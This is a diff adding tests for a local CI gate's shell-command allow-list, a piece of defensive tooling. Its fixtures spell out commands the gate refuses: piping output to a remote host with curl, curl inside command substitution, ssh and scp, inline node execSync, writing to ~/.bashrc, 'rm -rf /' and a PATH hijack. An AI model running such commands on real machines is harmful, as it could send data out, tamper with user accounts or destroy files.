@@ -13,6 +13,7 @@ import { join } from 'node:path';
 import {
   WORKFLOW, STEP_TABLE, JOB_TABLE, LINUX_ONLY, loadSteps, classify, buildPlan, ciWouldRun, childEnv,
 } from '../ci/local-pr-gate.mjs';
+import { unclassifiedCommands } from '../ci/local-gate-shell-allowlist.mjs';
 
 const CTX = { base: 'b'.repeat(40), head: 'h'.repeat(40), prNumber: '' };
 
@@ -177,3 +178,132 @@ test('Linux-only steps run on linux and are listed CI-only elsewhere', () => {
     assert.match(win.reason, /Linux-only/);
   }
 });
+
+// --- round 2: allow-list (B8) and conditions at every level ------------------
+// Each step below is HARMLESS on a CI runner and acts on the owner's machine and
+// accounts when run locally. The gate must refuse to run all of them.
+const ACTS_ON_OWNER = {
+  'git config user.email (not --global)': 'git config user.email ci@example.com',
+  'gh pr comment (gh falls back to the owner login)': 'gh pr comment 1 --body hi',
+  'curl -X POST to a deploy endpoint': 'curl -X POST https://example.invalid/deploy',
+  'an ssh line': 'ssh root@example.invalid uptime',
+  'a pipe whose second segment is not allowed': 'node scripts/x.mjs | curl -d @- https://example.invalid',
+  'a command substitution running curl': 'node scripts/x.mjs "$(curl https://example.invalid)"',
+  'a backtick substitution running curl': 'node scripts/x.mjs `curl https://example.invalid`',
+  'an && chain whose last command is not allowed': 'node scripts/x.mjs && gh issue close 1',
+  'a multi-line block whose last line is not allowed': 'node scripts/x.mjs\necho done\nscp a b:c',
+  'an inline node program': 'node -e "require(\'child_process\').execSync(\'id\')"',
+  'npx of an unlisted package': 'npx -y some-package',
+  'an npm script outside the allow-list': 'npm run deploy',
+  'bash -c': 'bash -c "id"',
+  'a redirect outside the repo': 'echo x > ~/.bashrc',
+  'a heredoc': 'cat <<EOT\nx\nEOT',
+};
+for (const [label, run] of Object.entries(ACTS_ON_OWNER)) {
+  test(`allow-list: pr-gate.yml gaining ${label} is refused`, () => {
+    const stepYaml = `      - name: Drift probe act\n        run: |\n          ${run.replace(/\n/g, '\n          ')}`;
+    withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
+      const errs = errorsOf(p);
+      assert.equal(errs.length, 1, JSON.stringify(errs));
+      assert.match(errs[0].key, /Drift probe act/);
+      assert.match(errs[0].problem, /unclassified command/);
+    });
+  });
+}
+
+test('allow-list: a nested ${{ format(...) }} expression is one unknown expression, not a pass', () => {
+  const stepYaml = `      - name: Drift probe nested\n        run: node scripts/x.mjs \${{ format('{0}', github.event.pull_request.title) }}`;
+  withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
+    const errs = errorsOf(p);
+    assert.equal(errs.length, 1, JSON.stringify(errs));
+    assert.match(errs[0].problem, /unknown expression/);
+  });
+});
+
+test('conditions: a job-level if is refused (a push-only job would run every step here)', () => {
+  withMutatedWorkflow((y) => y.replace('\n  python-tests:\n', "\n  python-tests:\n    if: github.event_name == 'push'\n"), (p) => {
+    const errs = errorsOf(p);
+    assert.equal(errs.length, 1, JSON.stringify(errs));
+    assert.match(errs[0].key, /python-tests :: \(job\)/);
+    assert.match(errs[0].problem, /job-level if/);
+  });
+});
+
+test('conditions: a job-level env holding a secret is refused on the steps that would run', () => {
+  withMutatedWorkflow((y) => y.replace('\n  gate:\n', '\n  gate:\n    env:\n      TOK: ${{ secrets.SOME_TOKEN }}\n'), (p) => {
+    const errs = errorsOf(p);
+    assert.ok(errs.length > 0);
+    assert.ok(errs.every((e) => /secrets\.SOME_TOKEN/.test(e.problem)), JSON.stringify(errs.slice(0, 2)));
+  });
+});
+
+test('conditions: a workflow-level env holding a secret is refused', () => {
+  withMutatedWorkflow((y) => y.replace('\njobs:\n', '\nenv:\n  TOK: ${{ secrets.SOME_TOKEN }}\njobs:\n'), (p) => {
+    const errs = errorsOf(p);
+    assert.ok(errs.length > 0);
+    assert.ok(errs.some((e) => /secrets\.SOME_TOKEN/.test(e.problem)));
+  });
+});
+
+test('conditions: a workflow-level env that hijacks the process (PATH) is refused', () => {
+  withMutatedWorkflow((y) => y.replace('\njobs:\n', '\nenv:\n  PATH: /tmp/evil\njobs:\n'), (p) => {
+    assert.ok(errorsOf(p).some((e) => /env not safe/.test(e.problem)));
+  });
+});
+
+test('conditions: workflow-level defaults are refused', () => {
+  withMutatedWorkflow((y) => y.replace('\njobs:\n', '\ndefaults:\n  run:\n    shell: pwsh\njobs:\n'), (p) => {
+    const errs = errorsOf(p);
+    assert.equal(errs.length, 1, JSON.stringify(errs));
+    assert.match(errs[0].problem, /workflow-level defaults/);
+  });
+});
+
+test('conditions: a step-level continue-on-error is refused (it would pass in CI and fail here)', () => {
+  const stepYaml = '      - name: Drift probe coe\n        continue-on-error: true\n        run: node scripts/x.mjs';
+  withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
+    const errs = errorsOf(p);
+    assert.equal(errs.length, 1, JSON.stringify(errs));
+    assert.match(errs[0].problem, /continue-on-error/);
+  });
+});
+
+test('conditions: a job-level if on a CI-only job is listed, not an error (it never runs here)', () => {
+  withMutatedWorkflow((y) => y.replace('\n  scraper-document-integration:\n', "\n  scraper-document-integration:\n    if: github.event_name == 'push'\n"), (p) => {
+    assert.deepEqual(errorsOf(p), []);
+  });
+});
+
+const ALLOWED = [
+  'node scripts/ci/x.mjs a b', 'node --test scripts/tests/a.test.mjs scripts/tests/b.test.mjs', 'node --max-old-space-size=4096 scripts/x.mjs',
+  'npx tsc --noEmit', 'npx vitest run -c vitest.config.ts tests/a.test.ts', 'npx --no-install eslint .', 'npx tsx src/index.ts --smoke-import',
+  'npm run lint:ci', 'npm run --silent build', 'bash scripts/tests/a.test.sh 2>&1 | tee /tmp/a.log', 'sh scripts/x.sh',
+  'python .claude/hooks/tests/a.test.py', 'python -m pytest scraper/scripts -q -p no:cacheprovider', 'python -m unittest discover -s scripts',
+  'cd packages/shared && npx tsc', 'echo ok >> /dev/null', 'test -f dist/a.d.ts || (echo "FATAL" && exit 1)', 'set -o pipefail',
+  'export FOO=bar', 'FOO=1 node scripts/x.mjs', 'rm -rf packages/shared/dist packages/shared/tsconfig.tsbuildinfo',
+  'if git diff --name-only "$A" "$B" | grep -qE "^web/"; then\n  echo run=true\nelse\n  echo run=false\nfi',
+  'node scripts/x.mjs "$(git rev-parse HEAD)"', 'node scripts/x.mjs \\\n  a \\\n  b', 'tail -n 40 /tmp/a.log',
+];
+for (const run of ALLOWED) {
+  test(`allow-list accepts: ${run.split('\n')[0]}`, () => {
+    assert.deepEqual(unclassifiedCommands(run), []);
+  });
+}
+
+const REFUSED = [
+  ['cd /', /cd must take/], ['cd ../x', /cd must take/], ['node -p 1', /inline or injected/], ['node --require ./x.js scripts/a.mjs', /inline or injected/],
+  ['node /abs/x.mjs', /repo-relative/], ['node ../x.mjs', /repo-relative/], ['npx drizzle-kit migrate', /not an allowed tool/],
+  ['npx tsx -e "1"', /inline code/], ['npm ci', /npm run/], ['npm install x', /npm run/], ['npm run build:evil', /allow-list/],
+  ['bash scripts/../../x.sh', /repo script/], ['python -c "1"', /repo .py/], ['python -m pip install x', /unittest or pytest/],
+  ['rm -rf /', /exact repo-relative/], ['rm -rf ..', /exact repo-relative/], ['rm -rf web/*', /exact repo-relative/], ['git push', /read-only/],
+  ['git diff --output=x.patch', /writes a file/], ['gh pr merge 1', /not an allowed program/], ['wget x', /not an allowed program/],
+  ['PATH=/tmp/evil node scripts/x.mjs', /process-hijacking/], ['echo "$GITHUB_OUTPUT"', /runner-only/], ['$(echo node) scripts/x.mjs', /substitution/],
+  ['f() { id; }', /function definition/], ['echo "unterminated', /unterminated/], ['echo $((1+1))', /arithmetic/], ['diff <(a) <(b)', /process substitution/],
+];
+for (const [run, why] of REFUSED) {
+  test(`allow-list refuses: ${run}`, () => {
+    const off = unclassifiedCommands(run);
+    assert.ok(off.length > 0, 'was accepted');
+    assert.match(off.map((o) => o.reason).join(' | '), why);
+  });
+}
